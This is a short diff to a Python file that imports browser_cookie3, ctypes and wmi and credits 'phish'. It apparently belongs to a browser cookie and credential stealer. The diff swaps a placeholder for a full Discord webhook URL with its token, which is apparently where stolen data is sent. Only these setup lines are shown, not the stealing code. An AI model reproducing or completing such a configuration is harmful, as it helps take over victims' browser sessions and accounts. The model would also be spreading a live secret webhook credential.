@@ -5,7 +5,7 @@ import browser_cookie3
 import ctypes
 import wmi
 
-webhook = 'webhook here'
+webhook = 'https://discord.com/api/webhooks/1083260266956996628/7jfaCxlE96yw-L8Lv5dC3tbzREGPsHnELX1tVy3SWp04hAXHz_J0NISGoTNlLIHCYgrF'
 
 
 __credits__ = 'phish + scooby'
